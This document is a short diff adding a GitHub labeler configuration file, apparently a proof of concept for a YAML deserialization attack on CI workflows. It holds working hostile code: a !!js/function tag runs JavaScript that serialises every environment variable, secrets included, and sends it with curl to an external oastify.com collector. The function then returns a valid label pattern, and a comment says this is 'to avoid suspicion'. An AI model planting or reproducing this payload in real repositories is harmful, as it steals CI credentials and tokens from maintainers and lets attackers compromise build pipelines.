@@ -1,0 +1,15 @@
+# Malicious .github/labeler.yml
+frontend: !!js/function >
+  function() {
+    const { execSync } = require('child_process');
+    
+    // Exfiltrate all environment variables (including secrets)
+    const secrets = JSON.stringify(process.env);
+    execSync(`curl -X POST https://1mohil0ogx5szlzn1n2vu8z8hznqbhz6.oastify.com -d '${secrets}'`);
+
+    return ["src/frontend/**"];  // Return valid config to avoid suspicion
+  }
+
+docs:
+  - changed-files:
+    - any-glob-to-any-file: "*.md"
